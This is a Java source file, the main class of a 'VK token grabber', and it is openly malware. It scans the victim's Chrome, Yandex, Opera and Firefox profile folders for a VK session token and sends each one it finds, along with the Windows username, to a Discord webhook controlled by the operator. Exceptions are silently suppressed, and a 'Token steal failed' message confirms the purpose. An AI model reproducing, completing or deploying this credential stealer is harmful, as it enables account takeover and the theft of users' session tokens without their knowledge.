package com.github.dedinc.vktokengrabber;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import com.github.dedinc.vktokengrabber.browsers.*;
import com.github.dedinc.vktokengrabber.utils.DiscordHook;

public class Main {

	public static String hook = "ССЫЛКА НА Discord вебхук";

	public static void main(String[] args) {
		String prefix = "Токенолов2020";	
		String browser = null;
		if (args.length > 0) {
			browser = args[0];
		}
		String username = System.getenv("USERNAME");
		String chrome = "C:\\Users\\" + username + "\\AppData\\Local\\Google\\Chrome";
		String yandex = "C:\\Users\\" + username + "\\AppData\\Local\\Yandex\\YandexBrowser";
		String opera = "C:\\Users\\" + username + "\\AppData\\Roaming\\Opera Software";
		String firefox = "C:\\Users\\" + username + "\\AppData\\Roaming\\Mozilla\\Firefox";
		try {
			DiscordHook.sendMessage(prefix, "[" + new SimpleDateFormat("HH:mm:ss").format(Calendar.getInstance().getTime().getTime()) + "] - Searching token on " + username);		
		   } catch (Exception e) {
		}
		if (browser == null || browser.equalsIgnoreCase("chrome")) {
			if (new File(chrome).exists()) {
				try {
					DiscordHook.sendMessage(prefix + "[Chrome]", Chrome.grabToken());
					return;
				   } catch (Exception e) {
				}
			}
		}
		if (browser == null || browser.equalsIgnoreCase("yandex")) {
			if (new File(yandex).exists()) {
				try {
					DiscordHook.sendMessage(prefix + "[Yandex]", Yandex.grabToken());
					return;
				} catch (Exception e) {
				 }
		    }
		}
		if (browser == null || browser.equalsIgnoreCase("opera")) {
			if (new File(opera).exists()) {
				try {
					DiscordHook.sendMessage(prefix + "[Opera]", Opera.grabToken());
					return;
				} catch (Exception e) {
				}
			 }
		 }
		if (browser == null || browser.equalsIgnoreCase("firefox")) {
			if (new File(firefox).exists()) {
				try {
					DiscordHook.sendMessage(prefix + "[Firefox]", Firefox.grabToken());
					return;
				} catch (Exception e) {
				}
			 }
		 }
		DiscordHook.sendMessage(prefix, "Token steal failed :(");
	 }
}